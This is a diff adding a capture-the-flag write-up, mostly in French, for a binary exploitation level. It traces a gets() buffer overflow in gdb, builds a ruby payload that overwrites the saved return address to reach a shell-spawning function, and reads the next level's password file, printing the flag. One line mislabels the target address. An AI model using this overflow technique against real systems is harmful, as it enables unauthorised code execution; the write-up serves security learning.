@@ -1,0 +1,84 @@
+Je desassemble le binaire level1 dans ghidra et j'apprend l'existence d'une fonction run().
+
+La fonction main fait un appel a gets() dans un buffer de taille 76.
+La fonction run() affiche "Good... Wait what?" sur STDOUT puis lance un shell avec system("/bin/sh")
+
+Je comprend qu'il faut que j'arrive a faire executer la fonction run() a mon binaire.
+
+Pour commencer je sais que mon buffer a une taille de 76, donc au dela de 76 caracteres j'ecrirais sur la stack.
+
+J'utilise gdb pour trouver combien de caracteres me permettent d'ecrire sur saved eip, le registre qui stock l'adresse de la prochaine instruction, ainsi si je remplace sa valeur par l'adresse de run(), le fonction sera appellee.
+
+Je commence par set un breakpoint juste apres l'appel a gets pour inspecter la stack.
+
+Lorque le programme me demande un input, je met 76 'A' puis des groupes de 4 lettres.
+
+$>gdb level1
+$
+(gdb)disas main
+(gdb)b *0x08048495
+(gdb)r
+Starting program: /home/user/level1/level1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
+
+(gdb)info frame
+
+=> saved eip 0x42424242
+
+De cette maniere j'apprend que eip contient 'BBBB', donc je sais a quel endroit mettre l'adresse de run().
+
+Pour recuperer l'adresse de run() je lance un info functions apres avoir relance gdb:
+
+(gdb)info functions
+All defined functions:
+
+Non-debugging symbols:
+0x080482f8  _init
+0x08048340  gets
+0x08048340  gets@plt
+0x08048350  fwrite
+0x08048350  fwrite@plt
+0x08048360  system
+0x08048360  system@plt
+0x08048370  __gmon_start__
+0x08048370  __gmon_start__@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
+0x080484a0  __libc_csu_init
+0x08048510  __libc_csu_fini
+0x08048512  __i686.get_pc_thunk.bx
+0x08048520  __do_global_ctors_aux
+0x0804854c  _fini
+
+=> l'adresse de run() est 0x08048444
+
+Pour ecrire cette adresse sur saved eip je dois la traduire en little endian et lui donner un format que la machine comprend en placant des \x a chaque bit:
+
+0x08048480 devient \x44\x84\x04\x08
+
+Mon payload final est donc 76 * 'A' + "\x44\x84\x04\x08"
+
+Je tente une premiere fois:
+
+$>ruby -e 'puts "A"*76 + "\x44\x84\x04\x08"' | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+J'obtient bien le print de la fonction run() mais il n'y a pas de shell
+
+Afetr some researches I find that the shell immediately terminates because there is no stream hodling it opened, and that it is possible to set stdin streasm to hold it opened by using a '-' after a cat command
+
+I retry:
+
+$>chmod 777 .
+$>ruby -e 'puts "A"*76 + "\x44\x84\x04\x08"' > out
+$>chmod 777 out
+$>cat out - | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
